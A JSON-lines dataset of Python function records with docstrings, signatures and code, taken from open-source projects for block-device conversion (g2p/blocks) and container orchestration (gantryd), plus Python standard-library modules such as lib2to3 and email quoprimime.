{"docstring": "# Don't use TemporaryDirectory, recursive cleanup\n# on a mountpoint would be bad\n", "func_signal": "def temp_mount(self):\n", "code": "mpoint = tempfile.mkdtemp(suffix='.privmnt')\n# Don't pass -n, Nilfs relies on /etc/mtab to find its mountpoint\n# TODO: use unshare() here\nquiet_call(\n    ['mount', '-t', self.vfstype, '-o', 'noatime,noexec,nodev',\n     '--', self.device.devpath, mpoint])\ntry:\n    yield mpoint\nfinally:\n    quiet_call('umount -- '.split() + [mpoint])\n    os.rmdir(mpoint)", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# No need to do anything, UUID and LABEL are already\n# exposed through blkid\n", "func_signal": "def read_superblock(self):\n", "code": "with self.device.open_excl_ctx() as dev_fd:\n    big_endian, version, last_page = self.__read_sb(dev_fd)\nself.block_size = 4096\nself.block_count = last_page + 1\nself.big_endian = big_endian\nself.version = version", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# this cries for a conslist\n", "func_signal": "def get_block_stack(device, progress):\n", "code": "stack = []\nwhile True:\n    if device.superblock_type == 'crypto_LUKS':\n        wrapper = LUKS(device)\n        stack.append(wrapper)\n        device = wrapper.cleartext_device\n        continue\n    elif device.has_bcache_superblock:\n        wrapper = BCacheBacking(device)\n        wrapper.read_superblock()\n        if not wrapper.is_backing:\n            # We only want backing, not all bcache superblocks\n            progress.bail(\n                'BCache device isn\\'t a backing device',\n                UnsupportedSuperblock(device=device))\n        stack.append(wrapper)\n        device = wrapper.cached_device\n        continue\n\n    if device.superblock_type in {'ext2', 'ext3', 'ext4'}:\n        stack.append(ExtFS(device))\n    elif device.superblock_type == 'reiserfs':\n        stack.append(ReiserFS(device))\n    elif device.superblock_type == 'btrfs':\n        stack.append(BtrFS(device))\n    elif device.superblock_type == 'nilfs2':\n        stack.append(NilFS(device))\n    elif device.superblock_type == 'xfs':\n        stack.append(XFS(device))\n    elif device.superblock_type == 'swap':\n        stack.append(Swap(device))\n    else:\n        err = UnsupportedSuperblock(device=device)\n        if device.superblock_type is None:\n            progress.bail('Unrecognised superblock', err)\n        else:\n            progress.bail(\n                'Unsupported superblock type: {}'\n                .format(err.device.superblock_type), err)\n\n    # only reached when we ended on a filesystem\n    return BlockStack(stack)", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# the outer ptable and our offset within that\n", "func_signal": "def ptable_context(self):\n", "code": "import parted.disk\n\nassert self.is_partition\n\nptable_device = PartitionedDevice(\n    devpath_from_sysdir(self.sysfspath + '/..'))\n\npart_start = int(open(self.sysfspath + '/start').read()) * 512\nptable = PartitionTable(\n    device=ptable_device,\n    parted_disk=parted.disk.Disk(ptable_device.parted_device))\nreturn ptable, part_start", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# align to a block boundary that doesn't encroach\n", "func_signal": "def reserve_end_area_nonrec(self, pos):\n", "code": "pos = align(pos, self.block_size)\n\nif self.fssize <= pos:\n    return\n\nif not self.can_shrink:\n    raise CantShrink(self)\n\nself._mount_and_resize(pos)\nreturn pos", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# pyudev would also work\n", "func_signal": "def sysfspath(self):\n", "code": "st = os.stat(self.devpath)\nassert stat.S_ISBLK(st.st_mode)\nreturn '/sys/dev/block/%d:%d' % self.devnum", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# cryptsetup uses the inner size\n", "func_signal": "def reserve_end_area_nonrec(self, pos):\n", "code": "inner_size = pos - self.offset\nsectors = bytes_to_sector(inner_size)\n\n# pycryptsetup is useless, no resize support\n# otoh, size doesn't appear in the superblock,\n# and updating the dm table is only useful if\n# we want to do some fsck before deactivating\nsubprocess.check_call(\n    ['cryptsetup', 'resize', '--size=%d' % sectors,\n     '--', self.cleartext_device.devpath])\nif self.snoop_activated():\n    self.cleartext_device.reset_size()\n    assert self.cleartext_device.size == inner_size\nreturn pos", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# Detect the alignment parted would use?\n# I don't think it can be greater than 1MiB, in which case\n# there is no need.\n", "func_signal": "def part_to_bcache(device, debug, progress, join):\n", "code": "bsb_size = 1024**2\ndata_size = device.size\nimport _ped\n\nptable, part_start = device.ptable_context()\nptype = ptable.parted_disk.getPartitionBySector(\n    bytes_to_sector(part_start)).type\nif ptype & _ped.PARTITION_LOGICAL:\n    progress.bail(\n        'Converting logical partitions is not supported.'\n        ' Please convert this disk to GPT.', UnsupportedLayout())\nassert ptype == _ped.PARTITION_NORMAL, ptype\nptable.reserve_space_before(part_start, bsb_size, progress)\npart_start1 = part_start - bsb_size\n\nimport _ped\nwrite_part = ptable.parted_disk.getPartitionBySector(part_start1 // 512)\n\nif write_part.type == _ped.PARTITION_NORMAL:\n    write_offset = part_start1 - (512 * write_part.geometry.start)\n    dev_fd = os.open(write_part.path, os.O_SYNC|os.O_RDWR|os.O_EXCL)\nelif write_part.type == _ped.PARTITION_FREESPACE:\n    # XXX Can't open excl if one of the partitions is used by dm, apparently\n    dev_fd = ptable.device.open_excl()\n    write_offset = part_start1\nelse:\n    print(\n        'Can\\'t write outside of a normal partition (marked {})'\n        .format(_ped.partition_type_get_name(write_part.type)),\n        file=sys.stderr)\n    return 1\n\nsynth_bdev = make_bcache_sb(bsb_size, data_size, join)\nprint('Copying the bcache superblock... ', end='', flush=True)\nsynth_bdev.copy_to_physical(\n    dev_fd, shift_by=write_offset, other_device=True)\nos.close(dev_fd)\ndel dev_fd\nprint('ok')\n\n# Check the partition we're about to convert isn't in use either,\n# otherwise the partition table couldn't be reloaded.\nwith device.open_excl_ctx():\n    pass\n\nprint(\n    'Shifting partition to start on the bcache superblock... ',\n    end='', flush=True)\nptable.shift_left(part_start, part_start1)\nprint('ok')\ndevice.reset_size()", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# O_EXCL on a block device takes the device lock,\n# exclusive against mounts and the like.\n# O_SYNC on a block device provides durability, see:\n# http://www.codeproject.com/Articles/460057/HDD-FS-O_SYNC-Throughput-vs-Integrity\n# O_DIRECT would bypass the block cache, which is irrelevant here\n", "func_signal": "def open_excl(self):\n", "code": "return os.open(\n    self.devpath, os.O_SYNC | os.O_RDWR | os.O_EXCL)", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# Assume 4k pages, bail otherwise\n# XXX The SB checks should be done before calling the constructor\n", "func_signal": "def __read_sb(self, dev_fd):\n", "code": "magic, = struct.unpack('10s', os.pread(dev_fd, 10, 4096 - 10))\nif magic != b'SWAPSPACE2':\n    # Might be suspend data\n    raise UnsupportedSuperblock(device=self.device, magic=magic)\nversion, last_page = struct.unpack('>II', os.pread(dev_fd, 8, 1024))\nbig_endian = True\nif version != 1:\n    version0 = version\n    version, last_page = struct.unpack('<II', os.pread(dev_fd, 8, 1024))\n    big_endian = False\nif version != 1:\n    raise UnsupportedSuperblock(\n        device=self.device, version=min(version, version0))\nif not last_page:\n    raise UnsupportedSuperblock(device=self.device, last_page=0)\n\nreturn big_endian, version, last_page", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "\"\"\" Sets the metadata field for the given container. \"\"\"\n", "func_signal": "def _setContainerField(container, field, value):\n", "code": "container_id = _getContainerId(container)\nfound = _getContainerFieldRecord(container_id, field)\nif found is not None:\n  found.value = value\n  found.save()\nelse:\n  container_record = _upsertContainerRecord(container_id)\n  ContainerField.create(container=container_record, key=field, value=value)", "path": "runtime\\metadata.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Returns the component that owns the given container. \"\"\"\n", "func_signal": "def getContainerComponent(container):\n", "code": "container_record = _upsertContainerRecord(container)\nreturn container_record.component and container_record.component.name", "path": "runtime\\metadata.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "# The registered routes, by external port number.\n", "func_signal": "def __init__(self):\n", "code": "self._port_routes = {}\n\njinja_options = {\n    \"loader\": FileSystemLoader(TEMPLATE_FOLDER),\n}\n\nenv = Environment(**jinja_options)\nself._template = env.get_template(HAPROXY_TEMPLATE)", "path": "proxy\\portproxy.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Returns the connection information for all proxy processes. \"\"\"\n", "func_signal": "def get_connections():\n", "code": "logger.debug('Getting proxy connections')\nconnections = []\nfor proc in psutil.process_iter():\n  if proc.is_running() and proc.name() == HAPROXY:\n    connections.extend([conn for conn in proc.get_connections() if conn.status != CLOSE_WAIT])\n\nreturn connections", "path": "proxy\\portproxy.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Waits for an command notification on the component in etcd. If one is received,\n    processes it by attempting to update the component.\n\"\"\"\n", "func_signal": "def waitForCommand(self):\n", "code": "is_initial_loop = True\nsleep_time = 0\nwhile True:\n  # Sleep and then check again.\n  time.sleep(sleep_time)\n  sleep_time = CHECK_SLEEP_TIME\n\n  # Check the component's status.\n  self.logger.debug('Checking state for component %s', self.component.getName())\n  state = self.state.getState()\n  self.logger.debug('Found state %s for component %s', state, self.component.getName())\n\n  # Determine whether we should give initial status messages.\n  was_initial_loop = is_initial_loop\n  is_initial_loop = False\n\n  # Take actions based on the status requested.\n  current_status = ComponentState.getStatusOf(state)\n  sleep_time = self.handleStatus(current_status, state, was_initial_loop)", "path": "gantryd\\componentwatcher.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Returns the metadata field for the given component or the default value. \"\"\"\n", "func_signal": "def getComponentField(component_name, field, default):\n", "code": "found = _getComponentFieldRecord(component_name, field)\nreturn found.value if found else default", "path": "runtime\\metadata.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Commits the changes made to the proxy. \"\"\"\n", "func_signal": "def commit(self):\n", "code": "logger.debug(\"Restarting haproxy with new rules.\")\n\n# If the port routes are empty, add a dummy mapping to the proxy.\nif len(self._port_routes.values()) == 0:\n  self.add_route(Route(False, 65535, '127.0.0.2', 65534, is_fake=True))\n\n# Write out the config.\nrendered = self._template.render({'port_routes': self._port_routes})\nwith open(HAPROXY_CONFIG_FILE, 'w') as config_file:\n  config_file.write(rendered)\n\n# Restart haproxy\nsubprocess.call('./restart-haproxy.sh', shell=True, close_fds=True)", "path": "proxy\\portproxy.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Builds state from the given args and sets the state. \"\"\"\n", "func_signal": "def buildAndSetState(self, **kwargs):\n", "code": "state_obj = dict(kwargs)\nself.setState(state_obj)", "path": "gantryd\\etcdstate.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Handles when the component has been marked to be killed. \"\"\"\n", "func_signal": "def handleKilled(self, was_initial_check):\n", "code": "self.monitor_event.clear()\n\nif was_initial_check:\n  report('Component %s is marked as killed' % self.component.getName(),\n         project=self.project_name, component=self.component)\n\nself.is_running = False\nself.component.stop(kill=True)\nreturn CHECK_SLEEP_TIME", "path": "gantryd\\componentwatcher.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Handles the various status states for the component, returning the\n    amount of time after which to retry lookup up the state or -1 for\n    terminated.\n\"\"\"\n", "func_signal": "def handleStatus(self, current_status, state, was_initial_check):\n", "code": "if current_status == STOPPED_STATUS:\n  return self.handleStopped(was_initial_check)\nelif current_status == KILLED_STATUS:\n  return self.handleKilled(was_initial_check)\nelif current_status == READY_STATUS or current_status == PULL_FAIL:\n  with self.update_lock:\n    return self.handleReady(state, was_initial_check)\n\nreturn CHECK_SLEEP_TIME", "path": "gantryd\\componentwatcher.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Starts the watcher. \"\"\"\n", "func_signal": "def start(self):\n", "code": "self.watcher_thread.start()\nself.monitor_thread.start()", "path": "gantryd\\componentwatcher.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Monitors a component by pinging it every MONITOR_SLEEP_TIME seconds or so. If a component\n    fails, then the system will try to restart it. If that fails, the component is marked\n    as dead.\n\"\"\"\n", "func_signal": "def monitorComponent(self):\n", "code": "while True:\n  # Wait for the component to be running.\n  self.monitor_event.wait()\n\n  # Sleep MONITOR_SLEEP_TIME seconds.\n  time.sleep(MONITOR_SLEEP_TIME)\n\n  # Check the component.\n  report('Checking in on component', project=self.project_name, component=self.component,\n         level=ReportLevels.BACKGROUND)\n\n  if not self.component.isHealthy():\n    self.logger.debug('Component %s is not healty', self.component.getName())\n    with self.update_lock:\n      # Just to be sure...\n      if not self.is_running:\n        continue\n\n      # Ensure that the component is still ready.\n      state = self.state.getState()\n      current_status = ComponentState.getStatusOf(state)\n      if current_status == READY_STATUS:\n        report('Component ' + self.component.getName() + ' is not healthy. Restarting...',\n               project=self.project_name, component=self.component)\n\n        if not self.component.update():\n          report('Could not restart component ' + self.component.getName(),\n                 project=self.project_name, component=self.component,\n                 level=ReportLevels.IMPORTANT)\n          self.monitor_event.clear()\n          continue", "path": "gantryd\\componentwatcher.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Sets the metadata field for the given component. \"\"\"\n", "func_signal": "def setComponentField(component_name, field, value):\n", "code": "found = _getComponentFieldRecord(component_name, field)\nif found is not None:\n  found.value = value\n  found.save()\nelse:\n  component = _upsertComponentRecord(component_name)\n  ComponentField.create(component=component, key=field, value=value)", "path": "runtime\\metadata.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Gets the state. \"\"\"\n", "func_signal": "def getState(self, default={}):\n", "code": "try:\n  self.logger.debug('Looking up etcd path: %s', self.state_path)\n  return json.loads(self.etcd_client.get(self.state_path).value)\nexcept KeyError as k:\n  pass\nexcept ValueError as v:\n  self.logger.exception(v)\n  pass\n\nreturn default", "path": "gantryd\\etcdstate.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Handles when the component has been marked to be stopped. \"\"\"\n", "func_signal": "def handleStopped(self, was_initial_check):\n", "code": "self.monitor_event.clear()\n\nif was_initial_check:\n  report('Component %s is marked as stopped' % self.component.getName(),\n         project=self.project_name, component=self.component)\n\nself.is_running = False\nself.component.stop(kill=False)\nreturn CHECK_SLEEP_TIME", "path": "gantryd\\componentwatcher.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Builds a health check to run and returns it. \"\"\"\n", "func_signal": "def buildHealthCheck(check_config):\n", "code": "kind = check_config.kind\nif not kind in HEALTH_CHECKS:\n  fail('Unknown health check: ' + kind)\n\nreturn HEALTH_CHECKS[kind](check_config)", "path": "health\\checks.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Returns the metadata field for the given container or the default value. \"\"\"\n", "func_signal": "def _getContainerField(container, field, default):\n", "code": "container_id = _getContainerId(container)\nfound = _getContainerFieldRecord(container_id, field)\nreturn found.value if found else default", "path": "runtime\\metadata.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Builds a termination signal and returns it. \"\"\"\n", "func_signal": "def buildTerminationSignal(check_config):\n", "code": "kind = check_config.kind\nif not kind in TERMINATION_SIGNALS:\n  fail('Unknown termination signal kind: ' + kind)\n\nreturn TERMINATION_SIGNALS[kind](check_config)", "path": "health\\checks.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Attempts to atomically replace the given previous state with a new state.\n    On success, returns the new state object. On failure, returns None.\n\"\"\"\n", "func_signal": "def replaceState(self, previous_state, new_state):\n", "code": "try:\n  self.logger.debug('Test and set replacing etcd path: %s', self.state_path)\n  original_contents_json = json.dumps(previous_state, separators=(',', ':'))\n  new_contents_json = json.dumps(new_state, separators=(',', ':'))\n  self.etcd_client.test_and_set(self.state_path, new_contents_json, original_contents_json)\nexcept ValueError as e:\n  self.logger.debug('Test and set replacment for etcd path %s failed', self.state_path)\n  return None\n\nreturn new_state", "path": "gantryd\\etcdstate.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "\"\"\" Sets the component code for the given container. \"\"\"\n", "func_signal": "def setContainerComponent(container, component_name):\n", "code": "component = _upsertComponentRecord(component_name)\ncontainer_record = _upsertContainerRecord(container)\ncontainer_record.component = component\ncontainer_record.save()", "path": "runtime\\metadata.py", "repo_name": "DevTable/gantryd", "stars": 266, "license": "apache-2.0", "language": "python", "size": 124}
{"docstring": "# First, find the sys import. We'll just hope it's global scope.\n", "func_signal": "def transform(self, node, results):\n", "code": "if \"sys_import\" in results:\n    if self.sys_import is None:\n        self.sys_import = results[\"sys_import\"]\n    return\n\nfunc = results[\"func\"].clone()\nfunc.prefix = u\"\"\nregister = pytree.Node(syms.power,\n                       Attr(Name(u\"atexit\"), Name(u\"register\"))\n                       )\ncall = Call(register, [func], node.prefix)\nnode.replace(call)\n\nif self.sys_import is None:\n    # That's interesting.\n    self.warning(node, \"Can't find sys import; Please add an atexit \"\n                     \"import at the top of your file.\")\n    return\n\n# Now add an atexit import after the sys import.\nnames = self.sys_import.children[1]\nif names.type == syms.dotted_as_names:\n    names.append_child(Comma())\n    names.append_child(Name(u\"atexit\", u\" \"))\nelse:\n    containing_stmt = self.sys_import.parent\n    position = containing_stmt.children.index(self.sys_import)\n    stmt_container = containing_stmt.parent\n    new_import = pytree.Node(syms.import_name,\n                      [Name(u\"import\"), Name(u\"atexit\", u\" \")]\n                      )\n    new = pytree.Node(syms.simple_stmt, [new_import])\n    containing_stmt.insert_child(position + 1, Newline())\n    containing_stmt.insert_child(position + 2, new)", "path": "build\\pywin\\Lib\\lib2to3\\fixes\\fix_exitfunc.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"Decode a quoted-printable string.\n\nLines are separated with eol, which defaults to \\\\n.\n\"\"\"\n", "func_signal": "def decode(encoded, eol=NL):\n", "code": "if not encoded:\n    return encoded\n# BAW: see comment in encode() above.  Again, we're building up the\n# decoded string with string concatenation, which could be done much more\n# efficiently.\ndecoded = ''\n\nfor line in encoded.splitlines():\n    line = line.rstrip()\n    if not line:\n        decoded += eol\n        continue\n\n    i = 0\n    n = len(line)\n    while i < n:\n        c = line[i]\n        if c != '=':\n            decoded += c\n            i += 1\n        # Otherwise, c == \"=\".  Are we at the end of the line?  If so, add\n        # a soft line break.\n        elif i+1 == n:\n            i += 1\n            continue\n        # Decode if in form =AB\n        elif i+2 < n and line[i+1] in hexdigits and line[i+2] in hexdigits:\n            decoded += unquote(line[i:i+3])\n            i += 3\n        # Otherwise, not in form =AB, pass literally\n        else:\n            decoded += c\n            i += 1\n\n        if i == n:\n            decoded += eol\n# Special case if original string did not end with eol\nif not encoded.endswith(eol) and decoded.endswith(eol):\n    decoded = decoded[:-1]\nreturn decoded", "path": "build\\pywin\\Lib\\email\\quoprimime.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "# values doesn't matter, only class and name are checked\n", "func_signal": "def test___eq__(self):\n", "code": "v1 = Variable(self.root, name=\"abc\")\nv2 = Variable(self.root, name=\"abc\")\nself.assertEqual(v1, v2)\n\nv3 = Variable(self.root, name=\"abc\")\nv4 = StringVar(self.root, name=\"abc\")\nself.assertNotEqual(v3, v4)", "path": "build\\pywin\\Lib\\lib-tk\\test\\test_tkinter\\test_variables.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "# Default to empty 'version' and 'id' strings.  Both defaults are used\n    # when 'firstline' is empty.  'id' defaults to empty when an id can not\n    # be deduced.\n", "func_signal": "def _parse_release_file(firstline):\n", "code": "    version = ''\n    id = ''\n# Parse the first line\n    m = _lsb_release_version.match(firstline)\n    if m is not None:\n        # LSB format: \"distro release x.x (codename)\"\n        return tuple(m.groups())\n# Pre-LSB format: \"distro x.x (codename)\"\n    m = _release_version.match(firstline)\n    if m is not None:\n        return tuple(m.groups())\n# Unknown format... take the first two words\n    l = string.split(string.strip(firstline))\n    if l:\n        version = l[0]\n        if len(l) > 1:\n            id = l[1]\n    return '', version, id", "path": "build\\pywin\\Lib\\platform.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"\nReturn the fully qualified names for fixers in the package pkg_name.\n\"\"\"\n", "func_signal": "def get_fixers_from_package(pkg_name):\n", "code": "return [pkg_name + \".\" + fix_name\n        for fix_name in get_all_fix_names(pkg_name, False)]", "path": "build\\pywin\\Lib\\lib2to3\\refactor.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"Run the tests without collecting errors in a TestResult\"\"\"\n", "func_signal": "def debug(self):\n", "code": "debug = _DebugResult()\nself.run(debug, True)", "path": "build\\pywin\\Lib\\unittest\\suite.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"Encode with quoted-printable, wrapping at maxlinelen characters.\n\nIf binary is False (the default), end-of-line characters will be converted\nto the canonical email end-of-line sequence \\\\r\\\\n.  Otherwise they will\nbe left verbatim.\n\nEach line of encoded text will end with eol, which defaults to \"\\\\n\".  Set\nthis to \"\\\\r\\\\n\" if you will be using the result of this function directly\nin an email.\n\nEach line will be wrapped at, at most, maxlinelen characters (defaults to\n76 characters).  Long lines will have the `soft linefeed' quoted-printable\ncharacter \"=\" appended to them, so the decoded text will be identical to\nthe original text.\n\"\"\"\n", "func_signal": "def encode(body, binary=False, maxlinelen=76, eol=NL):\n", "code": "if not body:\n    return body\n\nif not binary:\n    body = fix_eols(body)\n\n# BAW: We're accumulating the body text by string concatenation.  That\n# can't be very efficient, but I don't have time now to rewrite it.  It\n# just feels like this algorithm could be more efficient.\nencoded_body = ''\nlineno = -1\n# Preserve line endings here so we can check later to see an eol needs to\n# be added to the output later.\nlines = body.splitlines(1)\nfor line in lines:\n    # But strip off line-endings for processing this line.\n    if line.endswith(CRLF):\n        line = line[:-2]\n    elif line[-1] in CRLF:\n        line = line[:-1]\n\n    lineno += 1\n    encoded_line = ''\n    prev = None\n    linelen = len(line)\n    # Now we need to examine every character to see if it needs to be\n    # quopri encoded.  BAW: again, string concatenation is inefficient.\n    for j in range(linelen):\n        c = line[j]\n        prev = c\n        if bqre.match(c):\n            c = quote(c)\n        elif j+1 == linelen:\n            # Check for whitespace at end of line; special case\n            if c not in ' \\t':\n                encoded_line += c\n            prev = c\n            continue\n        # Check to see to see if the line has reached its maximum length\n        if len(encoded_line) + len(c) >= maxlinelen:\n            encoded_body += encoded_line + '=' + eol\n            encoded_line = ''\n        encoded_line += c\n    # Now at end of line..\n    if prev and prev in ' \\t':\n        # Special case for whitespace at end of file\n        if lineno + 1 == len(lines):\n            prev = quote(prev)\n            if len(encoded_line) + len(prev) > maxlinelen:\n                encoded_body += encoded_line + '=' + eol + prev\n            else:\n                encoded_body += encoded_line + prev\n        # Just normal whitespace at end of line\n        else:\n            encoded_body += encoded_line + prev + '=' + eol\n        encoded_line = ''\n    # Now look at the line we just finished and it has a line ending, we\n    # need to add eol to the end of the line.\n    if lines[lineno].endswith(CRLF) or lines[lineno][-1] in CRLF:\n        encoded_body += encoded_line + eol\n    else:\n        encoded_body += encoded_line\n    encoded_line = ''\nreturn encoded_body", "path": "build\\pywin\\Lib\\email\\quoprimime.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"Traverse an AST, applying a set of fixers to each node.\n\nThis is a helper method for refactor_tree().\n\nArgs:\n    fixers: a list of fixer instances.\n    traversal: a generator that yields AST nodes.\n\nReturns:\n    None\n\"\"\"\n", "func_signal": "def traverse_by(self, fixers, traversal):\n", "code": "if not fixers:\n    return\nfor node in traversal:\n    for fixer in fixers[node.type]:\n        results = fixer.match(node)\n        if results:\n            new = fixer.transform(node, results)\n            if new is not None:\n                node.replace(new)\n                node = new", "path": "build\\pywin\\Lib\\lib2to3\\refactor.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\" Accepts a list of fixers and returns a dictionary\n    of head node type --> fixer list.  \"\"\"\n", "func_signal": "def _get_headnode_dict(fixer_list):\n", "code": "head_nodes = collections.defaultdict(list)\nevery = []\nfor fixer in fixer_list:\n    if fixer.pattern:\n        try:\n            heads = _get_head_types(fixer.pattern)\n        except _EveryNode:\n            every.append(fixer)\n        else:\n            for node_type in heads:\n                head_nodes[node_type].append(fixer)\n    else:\n        if fixer._accept_type is not None:\n            head_nodes[fixer._accept_type].append(fixer)\n        else:\n            every.append(fixer)\nfor node_type in chain(pygram.python_grammar.symbol2number.itervalues(),\n                       pygram.python_grammar.tokens):\n    head_nodes[node_type].extend(every)\nreturn dict(head_nodes)", "path": "build\\pywin\\Lib\\lib2to3\\refactor.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"Generates lines as expected by tokenize from a list of lines.\n\nThis strips the first len(indent + self.PS1) characters off each line.\n\"\"\"\n", "func_signal": "def gen_lines(self, block, indent):\n", "code": "prefix1 = indent + self.PS1\nprefix2 = indent + self.PS2\nprefix = prefix1\nfor line in block:\n    if line.startswith(prefix):\n        yield line[len(prefix):]\n    elif line == prefix.rstrip() + u\"\\n\":\n        yield u\"\\n\"\n    else:\n        raise AssertionError(\"line=%r, prefix=%r\" % (line, prefix))\n    prefix = prefix2\nwhile True:\n    yield \"\"", "path": "build\\pywin\\Lib\\lib2to3\\refactor.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"Refactor a given input string.\n\nArgs:\n    data: a string holding the code to be refactored.\n    name: a human-readable name for use in error/log messages.\n\nReturns:\n    An AST corresponding to the refactored input stream; None if\n    there were errors during the parse.\n\"\"\"\n", "func_signal": "def refactor_string(self, data, name):\n", "code": "features = _detect_future_features(data)\nif \"print_function\" in features:\n    self.driver.grammar = pygram.python_grammar_no_print_statement\ntry:\n    tree = self.driver.parse_string(data)\nexcept Exception as err:\n    self.log_error(\"Can't parse %s: %s: %s\",\n                   name, err.__class__.__name__, err)\n    return\nfinally:\n    self.driver.grammar = self.grammar\ntree.future_features = features\nself.log_debug(\"Refactoring %s\", name)\nself.refactor_tree(tree, name)\nreturn tree", "path": "build\\pywin\\Lib\\lib2to3\\refactor.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"Return the length of str when it is encoded with header quopri.\"\"\"\n", "func_signal": "def header_quopri_len(s):\n", "code": "count = 0\nfor c in s:\n    if hqre.match(c):\n        count += 3\n    else:\n        count += 1\nreturn count", "path": "build\\pywin\\Lib\\email\\quoprimime.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"Run the tests without collecting errors in a TestResult\"\"\"\n", "func_signal": "def debug(self):\n", "code": "for test in self:\n    test.debug()", "path": "build\\pywin\\Lib\\unittest\\suite.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"Hook to log a message.\"\"\"\n", "func_signal": "def log_message(self, msg, *args):\n", "code": "if args:\n    msg = msg % args\nself.logger.info(msg)", "path": "build\\pywin\\Lib\\lib2to3\\refactor.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
